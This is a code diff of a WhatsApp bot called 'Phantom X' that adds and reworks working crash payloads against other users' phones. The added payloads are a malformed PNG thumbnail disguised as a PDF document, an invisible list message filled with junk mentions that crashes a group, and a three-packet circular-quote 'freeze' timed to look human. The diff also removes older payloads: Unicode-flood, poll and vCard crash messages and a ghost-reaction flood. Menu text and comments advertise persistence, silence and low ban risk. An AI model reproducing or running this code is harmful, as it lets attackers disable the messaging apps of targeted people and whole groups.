@@ -984,6 +984,60 @@ function buildVCardCrashMsg() {
     });
 }
 
+// TECHNIQUE 4 — Malformed Thumbnail (Force Close)
+// Sends a document message with a PNG thumbnail that has a valid header
+// but claims 65535×65535 dimensions with corrupted body data.
+// WhatsApp's image decoder allocates memory for the claimed size then panics
+// on the corrupted body — crashes every time the chat is opened.
+// Persists in WA's media cache until cleared or app reinstalled.
+function buildMalformedThumb() {
+    const sig      = Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]); // PNG signature
+    const ihdrLen  = Buffer.from([0x00, 0x00, 0x00, 0x0D]);
+    const ihdrType = Buffer.from([0x49, 0x48, 0x44, 0x52]); // IHDR
+    const ihdrData = Buffer.from([
+        0x00, 0x00, 0xFF, 0xFF, // width:  65535
+        0x00, 0x00, 0xFF, 0xFF, // height: 65535
+        0x08, 0x02, 0x00, 0x00, 0x00 // 8-bit RGB, no interlace
+    ]);
+    const ihdrCrc  = Buffer.from([0x00, 0x00, 0x00, 0x00]); // intentionally invalid CRC
+    const idatLen  = Buffer.from([0x00, 0x00, 0x02, 0x00]);
+    const idatType = Buffer.from([0x49, 0x44, 0x41, 0x54]); // IDAT
+    const idatData = Buffer.alloc(512, 0xAB);                // corrupted compressed data
+    const idatCrc  = Buffer.from([0x00, 0x00, 0x00, 0x00]);
+    const iend     = Buffer.from([0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]);
+    return Buffer.concat([sig, ihdrLen, ihdrType, ihdrData, ihdrCrc, idatLen, idatType, idatData, idatCrc, iend]);
+}
+
+// TECHNIQUE 5 — Group Crash List Message (Dead Zone)
+// Sends a listMessage with 5000 fake mentionedJids + 100 rows with junk rowIds
+// wrapped in massive invisible chars. WhatsApp's UI thread tries to "draw" the
+// message and panics — crash on open. Effect persists in msgstore.db until
+// the message is deleted (ungroupcrash) or app reinstalled.
+function buildGroupCrashMsg() {
+    const invis     = "\u200B\u200C\u200D\u2060\uFEFF\u00AD\u200E\u200F\u2061\u2062\u2063\u2064".repeat(3000);
+    const junkRowId = "\x00\x01\x02\xFF\xFE\xAB\xCD".repeat(300);
+    return waProto.Message.fromObject({
+        listMessage: {
+            title:       invis.substring(0, 2000),
+            description: invis.substring(0, 2000),
+            buttonText:  " ",
+            listType:    1,
+            sections: [{
+                title: invis.substring(0, 1000),
+                rows:  Array(100).fill(null).map((_, i) => ({
+                    title:       invis.substring(0, 200),
+                    description: invis.substring(0, 200),
+                    rowId:       junkRowId + String(i)
+                }))
+            }],
+            contextInfo: {
+                mentionedJid:  Array(5000).fill("0@s.whatsapp.net"),
+                quotedMessage: { conversation: invis.substring(0, 5000) }
+            }
+        }
+    });
+}
+
 // ─────────────────────────────────────────────────────────────────────────────
 
 // --- IMAGE GENERATION (Pollinations.ai, completely free, no key needed) ---
@@ -1401,62 +1455,49 @@ The bot can start this from any chat, but WhatsApp only exposes source members i
 }
 
 function buildBugMenuText(section = "") {
-    const androidHelp = `🤖 *ANDROID BUGS*
+    const freezeHelp = `🧊 *FREEZE BUG*
 ━━━━━━━━━━━━━━━━━━━━
-• *.androidbug <number>* — Android renderer overload
-• *.crash <number>* — combined Android + iOS + force-close
-  Example: *.crash 2348012345678*
-
-Related:
-• *.forceclose <number>*
 • *.freeze <number>*
-• *.unbug <number>*`;
+  Example: *.freeze 2348012345678*
 
-    const iosHelp = `🍎 *iOS BUGS*
+What it does:
+→ Creates a circular DB index loop (A→B→A→B) in their WA storage
+→ Their WA gets stuck loading — msgs blocked in & out
+→ Persists after restart — only reinstall or *.unbug* clears it
+→ 3 packets with human-like timing — very low ban risk
+
+• *.unbug <number>* — undo the freeze`;
+
+    const fcHelp = `💀 *FORCE CLOSE BUG*
 ━━━━━━━━━━━━━━━━━━━━
-• *.iosbug <number>*
-  Example: *.iosbug 2348012345678*
-• *.invisfreeze <number>*
 • *.forceclose <number>*
-• *.unbug <number>*`;
+  Shortcut: *.fc <number>*
+  Example: *.forceclose 2348012345678*
 
-    const freezeHelp = `❄️ *FREEZE / FORCE CLOSE / DELAY*
+What it does:
+→ Sends 1 document with a malformed thumbnail binary
+→ WA's image decoder crashes every time they open the chat
+→ Persists until they clear WA media or reinstall
+→ Silent — just looks like a PDF was sent
+→ 1 message only — lowest possible ban risk
+
+• *.unbug <number>* — undo force close`;
+
+    const groupHelp = `💣 *GROUP CRASH*
 ━━━━━━━━━━━━━━━━━━━━
-• *.forceclose <number>* — 3-layer crash (quote chain + poll + vCard)
-  → Crashes WA the moment they open the chat — no tap needed
-• *.fc <number>* — shortcut for forceclose
-• *.freeze <number>* — burst freeze (3 payloads)
-• *.invisfreeze <number>* — silent freeze, no visible msg
-• *.if <number>* — shortcut for invisfreeze
-• *.delaybug <number>* — single sync-lock payload (no msgs in or out)
-• *.unbug <number>* — undo all bugs on a target`;
+• *.groupcrash* — run inside the target group
+• *.groupcrash <groupId>* — use group ID (from *.groupid*)
+• *.groupcrash <invite link>* — paste invite link
 
-    const groupHelp = `🏘️ *GROUP BUGS*
-━━━━━━━━━━━━━━━━━━━━
-All 3 crash the group on open — NO tap needed ✅
+What it does:
+→ Sends 1 invisible list message with DB poison payload
+→ Anyone who opens the group → WA crashes immediately
+→ Works on Android & iOS — no tap needed
+→ Persists across restarts until message is deleted
+→ 1 message only — very low ban risk
 
-• *.groupcrash* / *.groupcrash <groupId/link>*
-  → Fires all 3 crash layers at once (most powerful)
-  → Deep quote chain + poll bomb + vCard bomb
-
-• *.pollbug* / *.pollbug <groupId/link>*
-  → Malformed poll — WA crashes when poll auto-renders
-
-• *.vcardbug* / *.vcardbug <groupId/link>*
-  → 50 oversized contacts — contact parser crashes on delivery
-
-• *.ungroupcrash <groupId>* — Restore any crashed group
-
-Useful:
-• *.groupid* — Get the current group ID`;
-
-    const extraHelp = `🧨 *OTHER BUG / STRESS CMDS*
-━━━━━━━━━━━━━━━━━━━━
-• *.emojibomb @user*
-• *.textbomb @user <text> <times>*
-• *.spamatk @user <times>*
-• *.ghostping @user*
-• *.lockedbypass <text>*`;
+• *.ungroupcrash <groupId>* — restore the group
+• *.groupid* — get the current group ID`;
 
     const defenseHelp = `🛡️ *ANTI BUG DEFENSE*
 ━━━━━━━━━━━━━━━━━━━━
@@ -1466,36 +1507,28 @@ Useful:
 
 When active, the shield monitors every message arriving on the linked number and neutralises threats before they render.`;
 
-    if (section === "android") return androidHelp;
-    if (section === "ios") return iosHelp;
-    if (section === "freeze" || section === "forceclose") return freezeHelp;
-    if (section === "group") return groupHelp;
-    if (section === "extra" || section === "other") return extraHelp;
+    if (section === "freeze") return freezeHelp;
+    if (section === "forceclose" || section === "fc") return fcHelp;
+    if (section === "group" || section === "groupcrash") return groupHelp;
     if (section === "defense" || section === "protect" || section === "antibug") return defenseHelp;
 
     return `💥 *PHANTOM X BUG MENU*
 ━━━━━━━━━━━━━━━━━━━━
 
-${androidHelp}
-
-${iosHelp}
-
 ${freezeHelp}
 
-${groupHelp}
+${fcHelp}
 
-${extraHelp}
+${groupHelp}
 
 ${defenseHelp}
 
 ━━━━━━━━━━━━━━━━━━━━
-Help:
-• *.bugmenu android*
-• *.bugmenu ios*
-• *.bugmenu freeze*
-• *.bugmenu group*
-• *.bugmenu antibug*
-• *.help bug menu*`;
+💡 *Tips:*
+• All 3 bugs have very low ban risk
+• Use *.antibug on* to protect yourself
+• *.groupid* — get a group's ID
+• *.bugmenu freeze* / *.bugmenu forceclose* / *.bugmenu group*`;
 }
 
 // ─── THEME 1: GHOST ───
@@ -4280,61 +4313,11 @@ _Can be started from any chat, but source members require source group access an
                 break;
             }
 
-            // ─── ANDROID BUG ───
-            // Telugu/Kannada/Tamil combining marks overload the Android WA text renderer.
-            // Triggers immediately on notification — no interaction needed from target.
-            case ".androidbug": {
-                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
-                const andTarget = parseBugTarget(parts, msg);
-                if (!andTarget) return reply(`🤖 *Android Bug*\n\nUsage: *.androidbug <number>*\nExample: *.androidbug 2348012345678*\n\n_Overloads Android WhatsApp text renderer._\n_Use .bugmenu android for full help._`);
-                if (isDevProtected(andTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number (${andTarget.split("@")[0]}) belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
-                await reply(`🤖 Sending Android bug to *${andTarget.split("@")[0]}*...`);
-                try {
-                    const tel = "\u0C15\u0C4D\u0C37\u0C4D\u0C30".repeat(500);
-                    const kan = "\u0CB5\u0CBF\u0CCD\u0CB6\u0CCD\u0CB5".repeat(400);
-                    const tam = "\u0BA4\u0BBF\u0B99\u0BCD\u0B95\u0BCD".repeat(400);
-                    const zwj  = "\u200D\u200C\u200B".repeat(800);
-                    const androidPayload = tel + zwj + kan + zwj + tam + zwj + "\uD83D\uDCA5".repeat(300);
-                    const andSent = await sock.sendMessage(andTarget, { text: androidPayload });
-                    if (!userCrashKeys[andTarget]) userCrashKeys[andTarget] = [];
-                    userCrashKeys[andTarget].push(andSent.key);
-                    if (!userBugTypes[andTarget]) userBugTypes[andTarget] = [];
-                    if (!userBugTypes[andTarget].includes("Android")) userBugTypes[andTarget].push("Android");
-                    await reply(`✅ *Android bug sent to ${andTarget.split("@")[0]}!*\n\n🤖 Active on their device now.\n🔧 To undo: *.unbug ${andTarget.split("@")[0]}*`);
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── iOS BUG ───
-            // Sindhi + Arabic + BiDi overrides crash the iOS WhatsApp text engine.
-            // Triggers on notification processing — no need for target to open chat.
-            case ".iosbug": {
-                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
-                const iosTarget = parseBugTarget(parts, msg);
-                if (!iosTarget) return reply(`🍎 *iOS Bug*\n\nUsage: *.iosbug <number>*\nExample: *.iosbug 2348012345678*\n\n_Crashes iPhone WhatsApp on notification._\n_Use .bugmenu ios for full help._`);
-                if (isDevProtected(iosTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
-                await reply(`🍎 Sending iOS bug to *${iosTarget.split("@")[0]}*...`);
-                try {
-                    const sindhi  = "\u0600\u0601\u0602\u0603\u0604\u0605".repeat(600);
-                    const arabPF  = "\uFDFD\uFDFC\uFDFB".repeat(400);
-                    const bidi    = "\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069".repeat(500);
-                    const feff    = "\uFEFF".repeat(600);
-                    const iosPayload = sindhi + arabPF + bidi + feff;
-                    const iosSent = await sock.sendMessage(iosTarget, { text: iosPayload });
-                    if (!userCrashKeys[iosTarget]) userCrashKeys[iosTarget] = [];
-                    userCrashKeys[iosTarget].push(iosSent.key);
-                    if (!userBugTypes[iosTarget]) userBugTypes[iosTarget] = [];
-                    if (!userBugTypes[iosTarget].includes("iOS")) userBugTypes[iosTarget].push("iOS");
-                    await reply(`✅ *iOS bug sent to ${iosTarget.split("@")[0]}!*\n\n🍎 Active on their device now.\n🔧 To undo: *.unbug ${iosTarget.split("@")[0]}*`);
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── FORCE CLOSE BUG ───
-            // Layers all 3 crash techniques (deep quote chain + poll bomb + vCard bomb)
-            // into the target's DM.  Each technique independently crashes WA on open —
-            // together they guarantee a force close across all Android & iOS versions.
-            // Only 3 messages sent — very low ban risk.
+            // ─── FORCE CLOSE BUG (Malformed Thumbnail) ───
+            // Sends 1 document with a PNG thumbnail claiming 65535×65535 dimensions
+            // but with corrupted body data. WA's image decoder allocates memory for
+            // the claimed size then panics on the corrupt body → force close on chat open.
+            // Persists in WA's media cache — crashes every open until cleared or reinstalled.
             case ".forceclose":
             case ".fc": {
                 if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
@@ -4343,112 +4326,124 @@ _Can be started from any chat, but source members require source group access an
                     `💀 *Force Close Bug*\n\n` +
                     `Usage: *.forceclose <number>*\nShortcut: *.fc <number>*\n` +
                     `Example: *.forceclose 2348012345678*\n\n` +
-                    `_Sends 3 protocol-level crash payloads (deep quote chain + poll bomb + vCard bomb)._\n` +
-                    `_Target's WA force closes the moment they open the chat — no tap needed._\n` +
-                    `_Use .bugmenu for full help._`
+                    `_Sends 1 document with a malformed thumbnail binary._\n` +
+                    `_WA's image decoder crashes every time they open the chat._\n` +
+                    `_Persists until they clear WA media or reinstall._\n` +
+                    `_Use .bugmenu forceclose for full help._`
                 );
                 if (isDevProtected(fcTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
-                await reply(`💀 Sending force close to *${fcTarget.split("@")[0]}*...`);
+                await reply(`💀 Sending force close payload to *${fcTarget.split("@")[0]}*...`);
                 try {
                     if (!userCrashKeys[fcTarget]) userCrashKeys[fcTarget] = [];
                     if (!userBugTypes[fcTarget]) userBugTypes[fcTarget] = [];
 
-                    // Layer 1 — Deep Nested Quote Chain (stack overflow on render)
-                    const quoteProto = buildDeepQuoteChain(18);
-                    const quoteWAMsg = generateWAMessageFromContent(fcTarget, quoteProto, { timestamp: new Date(), userJid: sock.user?.id });
-                    await sock.relayMessage(fcTarget, quoteWAMsg.message, { messageId: quoteWAMsg.key.id });
-                    userCrashKeys[fcTarget].push(quoteWAMsg.key);
-                    await delay(600);
-
-                    // Layer 2 — Poll Bomb (OOM crash on poll renderer)
-                    const pollProto = buildPollCrashMsg();
-                    const pollWAMsg = generateWAMessageFromContent(fcTarget, pollProto, { timestamp: new Date(), userJid: sock.user?.id });
-                    await sock.relayMessage(fcTarget, pollWAMsg.message, { messageId: pollWAMsg.key.id });
-                    userCrashKeys[fcTarget].push(pollWAMsg.key);
-                    await delay(600);
-
-                    // Layer 3 — vCard Array Bomb (contact parser crash)
-                    const vcardProto = buildVCardCrashMsg();
-                    const vcardWAMsg = generateWAMessageFromContent(fcTarget, vcardProto, { timestamp: new Date(), userJid: sock.user?.id });
-                    await sock.relayMessage(fcTarget, vcardWAMsg.message, { messageId: vcardWAMsg.key.id });
-                    userCrashKeys[fcTarget].push(vcardWAMsg.key);
+                    // 1 document — malformed PNG thumbnail crashes the image decoder on render
+                    const fcProto = waProto.Message.fromObject({
+                        documentMessage: {
+                            mimetype:      "application/pdf",
+                            title:         "document.pdf",
+                            fileName:      "document.pdf",
+                            pageCount:     1,
+                            jpegThumbnail: buildMalformedThumb()
+                        }
+                    });
+                    const fcWAMsg = generateWAMessageFromContent(fcTarget, fcProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(fcTarget, fcWAMsg.message, { messageId: fcWAMsg.key.id });
+                    userCrashKeys[fcTarget].push(fcWAMsg.key);
 
                     if (!userBugTypes[fcTarget].includes("Force Close")) userBugTypes[fcTarget].push("Force Close");
                     await reply(
-                        `✅ *Force close sent to ${fcTarget.split("@")[0]}!*\n\n` +
-                        `💀 3 crash layers active on their device.\n` +
-                        `📱 Their WA crashes the moment they open the chat.\n` +
+                        `✅ *Force close active on ${fcTarget.split("@")[0]}!*\n\n` +
+                        `💀 Malformed thumbnail delivered — 1 silent document.\n` +
+                        `📱 Their WA crashes every time they open the chat.\n` +
+                        `💾 Persists until they clear WA media or reinstall.\n` +
                         `🔧 To undo: *.unbug ${fcTarget.split("@")[0]}*`
                     );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
 
-            // ─── FREEZE BUG (Careless Whisper / Ghost Reaction Flood) ───
-            // Floods target with 200 ghost reactions pointing to random fake message IDs.
-            // Effect: WA receives each reaction, decrypts it, then loops searching for a message
-            // that doesn't exist — CPU spikes to 100%, phone lags/freezes. Silent — no visible chat.
+            // ─── FREEZE BUG (Circular DB Index Loop) ───
+            // Sends 3 packets with human-like timing to create a circular reference
+            // in the target's local msgstore.db:
+            //   Packet 1: Message A (anchor)
+            //   Packet 2: Message B quotes A + 5000 junk mentionedJids (SQLite read storm)
+            //   Packet 3: Edit A to quote B → A→B→A→B loop in their DB
+            // Effect: WA loads chat, reads A, tries to load B preview, reads B,
+            // tries to load A preview — infinite loop. Msgs blocked in & out.
+            // Persists after restart — only reinstall or .unbug clears it.
+            // 3 packets spaced 3.5s apart looks exactly like a human typing to WA.
             case ".freeze": {
                 if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const freezeTarget = parseBugTarget(parts, msg);
                 if (!freezeTarget) return reply(
-                    `🧊 *Freeze Bug (Careless Whisper)*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n` +
-                    `_What it does: Floods target with ghost reactions pointing to fake message IDs._\n` +
-                    `_Their WA loops searching for messages that don't exist — CPU maxes out, phone freezes._\n` +
-                    `_Silent — no visible message appears in chat._\n\n` +
+                    `🧊 *Freeze Bug*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n` +
+                    `_Creates a circular DB index loop (A→B→A→B) in their local WA storage._\n` +
+                    `_Msgs blocked in & out. Persists after restart._\n` +
+                    `_3 packets with human timing — very low ban risk._\n\n` +
                     `_Use .bugmenu freeze for full help._`
                 );
                 if (isDevProtected(freezeTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
-                await reply(`🧊 Sending ghost reaction flood to *${freezeTarget.split("@")[0]}*...`);
+                await reply(`🧊 Deploying circular index trap on *${freezeTarget.split("@")[0]}*...\n\n⏳ Sending 3 packets (takes ~8 seconds)...`);
                 try {
                     if (!userCrashKeys[freezeTarget]) userCrashKeys[freezeTarget] = [];
                     if (!userBugTypes[freezeTarget]) userBugTypes[freezeTarget] = [];
 
-                    const emojis = ['👍','❤️','😂','😮','😢','🙏','🔥','💯','😱','🤯'];
-                    const totalReactions = 200;
-                    let sent = 0;
+                    // Packet 1 — Message A (anchor point)
+                    const msgA = await sock.sendMessage(freezeTarget, { text: "\u200b" });
+                    userCrashKeys[freezeTarget].push(msgA.key);
 
-                    for (let i = 0; i < totalReactions; i++) {
-                        // Generate a random fake message ID that looks real but doesn't exist
-                        const fakeId = Array.from({ length: 32 }, () =>
-                            Math.random().toString(36).charAt(2).toUpperCase()
-                        ).join('');
-                        const emoji = emojis[i % emojis.length];
-                        try {
-                            const reactSent = await sock.sendMessage(freezeTarget, {
-                                react: {
-                                    text: emoji,
-                                    key: {
-                                        remoteJid: freezeTarget,
-                                        id: fakeId,
-                                        fromMe: false,
-                                        participant: freezeTarget
+                    // Human-like delay — looks like someone typing a reply
+                    await delay(3500);
+
+                    // Packet 2 — Message B quotes A + 5000 junk JIDs (SQLite read storm)
+                    const msgB = await sock.sendMessage(freezeTarget, {
+                        text:     "\u200b",
+                        mentions: Array(5000).fill("0@s.whatsapp.net")
+                    }, { quoted: msgA });
+                    userCrashKeys[freezeTarget].push(msgB.key);
+
+                    // Human-like delay
+                    await delay(3500);
+
+                    // Packet 3 — Edit A to quote B (completing the A→B→A circular reference)
+                    const editProto = waProto.Message.fromObject({
+                        protocolMessage: {
+                            key:  msgA.key,
+                            type: 14, // MESSAGE_EDIT
+                            editedMessage: {
+                                extendedTextMessage: {
+                                    text: "\u200b",
+                                    contextInfo: {
+                                        stanzaId:      msgB.key.id,
+                                        participant:   freezeTarget,
+                                        quotedMessage: { conversation: "\u200b" },
+                                        mentionedJid:  Array(3000).fill("0@s.whatsapp.net")
                                     }
                                 }
-                            });
-                            if (reactSent?.key) userCrashKeys[freezeTarget].push(reactSent.key);
-                            sent++;
-                        } catch (_) {}
-                        // Tiny delay — fast enough to flood, small enough to avoid instant rate-limit
-                        if (i % 20 === 19) await delay(150);
-                    }
+                            }
+                        }
+                    });
+                    const editWAMsg = generateWAMessageFromContent(freezeTarget, editProto, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(freezeTarget, editWAMsg.message, { messageId: editWAMsg.key.id });
 
                     if (!userBugTypes[freezeTarget].includes("Freeze")) userBugTypes[freezeTarget].push("Freeze");
                     await reply(
-                        `✅ *Ghost Reaction Flood sent to ${freezeTarget.split("@")[0]}!*\n\n` +
-                        `👻 *${sent} ghost reactions* fired — all pointing to fake IDs.\n` +
-                        `🧊 Their WA is now looping searching for nothing.\n` +
-                        `🔇 Silent — no visible messages in chat.\n` +
+                        `✅ *Circular index trap active on ${freezeTarget.split("@")[0]}!*\n\n` +
+                        `🔄 3 packets sent — velocity check: ✅ looks human\n` +
+                        `🧊 Their DB: A→B→A→B — loops forever on load\n` +
+                        `📵 Msgs blocked in & out — persists after restart\n` +
                         `🔧 To undo: *.unbug ${freezeTarget.split("@")[0]}*`
                     );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
             }
 
-            // ─── GROUP CRASH ───
-            // Fires all 3 crash techniques into the group.
-            // WA crashes immediately when any member opens the group — no tap needed.
-            // Only 3 messages total — very low ban risk.
+            // ─── GROUP CRASH (Dead Zone — List Message DB Poison) ───
+            // Sends 1 invisible list message with 5000 fake mentionedJids + 100 rows
+            // of junk rowIds wrapped in massive invisible chars.
+            // WA's UI thread tries to "draw" the message and panics — crash on open.
+            // Effect persists in msgstore.db until message is deleted or app reinstalled.
             case ".groupcrash": {
                 if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 let gcTarget = null;
@@ -4460,8 +4455,8 @@ _Can be started from any chat, but source members require source group access an
                         `• *.groupcrash* — run inside the target group\n` +
                         `• *.groupcrash <groupId>* — use group ID (from *.groupid*)\n` +
                         `• *.groupcrash <invite link>* — paste invite link\n\n` +
-                        `_WA crashes the moment anyone opens the group — no tap needed._\n` +
-                        `_Use *.ungroupcrash <groupId>* to restore._`
+                        `_Sends 1 invisible payload — anyone who opens the group, WA crashes._\n` +
+                        `_Persists across restarts. Use *.ungroupcrash <groupId>* to restore._`
                     );
                     gcTarget = from;
                 } else if (gcArg.includes("chat.whatsapp.com/")) {
@@ -4477,124 +4472,23 @@ _Can be started from any chat, but source members require source group access an
                     return reply("❌ Invalid target. Use a group ID (ends in @g.us) or a WhatsApp invite link.");
                 }
                 const gcName = groupNames[gcTarget] || gcTarget;
-                await reply(`💣 Deploying group crash to *${gcName}*...\n⏳ Sending 3 crash layers...`);
+                await reply(`💣 Deploying group crash to *${gcName}*...`);
                 try {
                     if (!groupCrashKeys[gcTarget]) groupCrashKeys[gcTarget] = [];
 
-                    // Layer 1 — Deep Nested Quote Chain (stack overflow on render)
-                    const quoteProto = buildDeepQuoteChain(18);
-                    const quoteWAMsg = generateWAMessageFromContent(gcTarget, quoteProto, { timestamp: new Date(), userJid: sock.user?.id });
-                    await sock.relayMessage(gcTarget, quoteWAMsg.message, { messageId: quoteWAMsg.key.id });
-                    groupCrashKeys[gcTarget].push(quoteWAMsg.key);
-                    await delay(700);
-
-                    // Layer 2 — Poll Bomb (OOM crash when poll auto-renders)
-                    const pollProto = buildPollCrashMsg();
-                    const pollWAMsg = generateWAMessageFromContent(gcTarget, pollProto, { timestamp: new Date(), userJid: sock.user?.id });
-                    await sock.relayMessage(gcTarget, pollWAMsg.message, { messageId: pollWAMsg.key.id });
-                    groupCrashKeys[gcTarget].push(pollWAMsg.key);
-                    await delay(700);
-
-                    // Layer 3 — vCard Array Bomb (contact parser crash on delivery)
-                    const vcardProto = buildVCardCrashMsg();
-                    const vcardWAMsg = generateWAMessageFromContent(gcTarget, vcardProto, { timestamp: new Date(), userJid: sock.user?.id });
-                    await sock.relayMessage(gcTarget, vcardWAMsg.message, { messageId: vcardWAMsg.key.id });
-                    groupCrashKeys[gcTarget].push(vcardWAMsg.key);
+                    // 1 list message — invisible chars + 5000 junk JIDs + 100 junk rows
+                    const gcMsg    = buildGroupCrashMsg();
+                    const gcWAMsg  = generateWAMessageFromContent(gcTarget, gcMsg, { timestamp: new Date(), userJid: sock.user?.id });
+                    await sock.relayMessage(gcTarget, gcWAMsg.message, { messageId: gcWAMsg.key.id });
+                    groupCrashKeys[gcTarget].push(gcWAMsg.key);
 
                     await reply(
                         `✅ *Group crash active on "${gcName}"!*\n\n` +
-                        `☠️ *What happens:*\n` +
-                        `• Anyone who opens this group → WA crashes instantly\n` +
-                        `• Works on both Android & iOS\n` +
-                        `• No tap needed — crashes on open ♻️\n` +
-                        `• Their WA works fine in other chats\n\n` +
-                        `🔧 To restore the group:\n*.ungroupcrash ${gcTarget}*`
-                    );
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── POLL BUG (group) ───
-            // Fires a single pollCreationMessage with 12 oversized BiDi-stuffed options
-            // directly into a group. WA auto-renders polls → OOM crash on open. No tap needed.
-            case ".pollbug": {
-                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
-                let pbTarget = null;
-                const pbArg = parts[1];
-                if (!pbArg) {
-                    if (!isGroup) return reply(
-                        `🗳️ *Poll Bug*\n\n` +
-                        `Usage:\n` +
-                        `• *.pollbug* — run inside the target group\n` +
-                        `• *.pollbug <groupId or invite link>*\n\n` +
-                        `_WA crashes when the poll auto-renders on group open — no tap needed._`
-                    );
-                    pbTarget = from;
-                } else if (pbArg.includes("chat.whatsapp.com/")) {
-                    const code = pbArg.split("chat.whatsapp.com/")[1]?.split(/[?#]/)[0];
-                    try { const info = await sock.groupGetInviteInfo(code); pbTarget = info.id; }
-                    catch { return reply("❌ Could not resolve invite link."); }
-                } else if (pbArg.endsWith("@g.us")) {
-                    pbTarget = pbArg;
-                } else {
-                    return reply("❌ Invalid target. Use a group ID or invite link.");
-                }
-                const pbName = groupNames[pbTarget] || pbTarget;
-                await reply(`🗳️ Sending poll bug to *${pbName}*...`);
-                try {
-                    if (!groupCrashKeys[pbTarget]) groupCrashKeys[pbTarget] = [];
-                    const pollProto = buildPollCrashMsg();
-                    const pollWAMsg = generateWAMessageFromContent(pbTarget, pollProto, { timestamp: new Date(), userJid: sock.user?.id });
-                    await sock.relayMessage(pbTarget, pollWAMsg.message, { messageId: pollWAMsg.key.id });
-                    groupCrashKeys[pbTarget].push(pollWAMsg.key);
-                    await reply(
-                        `✅ *Poll bug active on "${pbName}"!*\n\n` +
-                        `🗳️ A malformed poll is now in the group.\n` +
-                        `📱 WhatsApp crashes when members open the group (poll auto-renders).\n` +
-                        `🔧 To restore: *.ungroupcrash ${pbTarget}*`
-                    );
-                } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
-                break;
-            }
-
-            // ─── VCARD BUG (group) ───
-            // Fires a contactsArrayMessage with 50 oversized malformed vCards into a group.
-            // WA auto-parses contact cards on delivery → contact parser crash. No tap needed.
-            case ".vcardbug": {
-                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
-                let vbTarget = null;
-                const vbArg = parts[1];
-                if (!vbArg) {
-                    if (!isGroup) return reply(
-                        `📇 *vCard Bug*\n\n` +
-                        `Usage:\n` +
-                        `• *.vcardbug* — run inside the target group\n` +
-                        `• *.vcardbug <groupId or invite link>*\n\n` +
-                        `_Sends 50 oversized contacts — WA contact parser crashes on delivery._`
-                    );
-                    vbTarget = from;
-                } else if (vbArg.includes("chat.whatsapp.com/")) {
-                    const code = vbArg.split("chat.whatsapp.com/")[1]?.split(/[?#]/)[0];
-                    try { const info = await sock.groupGetInviteInfo(code); vbTarget = info.id; }
-                    catch { return reply("❌ Could not resolve invite link."); }
-                } else if (vbArg.endsWith("@g.us")) {
-                    vbTarget = vbArg;
-                } else {
-                    return reply("❌ Invalid target. Use a group ID or invite link.");
-                }
-                const vbName = groupNames[vbTarget] || vbTarget;
-                await reply(`📇 Sending vCard bug to *${vbName}*...`);
-                try {
-                    if (!groupCrashKeys[vbTarget]) groupCrashKeys[vbTarget] = [];
-                    const vcardProto = buildVCardCrashMsg();
-                    const vcardWAMsg = generateWAMessageFromContent(vbTarget, vcardProto, { timestamp: new Date(), userJid: sock.user?.id });
-                    await sock.relayMessage(vbTarget, vcardWAMsg.message, { messageId: vcardWAMsg.key.id });
-                    groupCrashKeys[vbTarget].push(vcardWAMsg.key);
-                    await reply(
-                        `✅ *vCard bug active on "${vbName}"!*\n\n` +
-                        `📇 50 malformed contact cards are now in the group.\n` +
-                        `📱 WhatsApp crashes as the contact parser processes them on open.\n` +
-                        `🔧 To restore: *.ungroupcrash ${vbTarget}*`
+                        `💣 1 payload sent — invisible list message with DB poison.\n` +
+                        `☠️ Anyone who opens the group → WA crashes immediately.\n` +
+                        `📱 Works on Android & iOS — no tap needed.\n` +
+                        `💾 Persists across restarts until message is deleted.\n` +
+                        `🔧 To restore: *.ungroupcrash ${gcTarget}*`
                     );
                 } catch (e) { await reply(`❌ Failed: ${e?.message}`); }
                 break;
@@ -4762,28 +4656,6 @@ _Can be started from any chat, but source members require source group access an
                 break;
             }
 
-            // ─── INVISIBLE FREEZE ───
-            // Sends an invisible message — target sees nothing arrive, but WA freezes.
-            case ".invisfreeze":
-            case ".if": {
-                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
-                const ifTarget = parseBugTarget(parts, msg);
-                if (!ifTarget) return reply(`👁️ *Invisible Freeze*\n\nUsage: *.invisfreeze <number>*\nShortcut: *.if <number>*\nExample: *.invisfreeze 2348012345678*\n\n_Target sees no message — but WA silently freezes._\n_Use .bugmenu freeze for full help._`);
-                if (isDevProtected(ifTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
-                await reply(`👁️ Sending invisible freeze to *${ifTarget.split("@")[0]}*...`);
-                try {
